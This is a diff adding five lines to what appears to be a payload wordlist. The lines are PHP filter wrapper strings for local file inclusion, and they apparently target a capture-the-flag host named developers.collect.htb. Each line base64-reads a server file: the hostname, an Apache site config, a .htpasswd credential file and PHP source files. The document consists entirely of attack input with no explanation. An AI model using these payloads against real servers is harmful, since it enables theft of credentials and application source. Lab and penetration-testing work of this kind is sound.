@@ -1,0 +1,5 @@
+php://filter/convert.base64-encode/resource=/etc/hostname
+php://filter/convert.base64-encode/resource=/etc/apache2/sites-available/developers.collect.htb.conf
+php://filter/convert.base64-encode/resource=/var/www/developers/.htpasswd
+php://filter/convert.base64-encode/resource=/var/www/developers/index.php
+php://filter/convert.base64-encode/resource=/var/www/developers/bootstrap.php
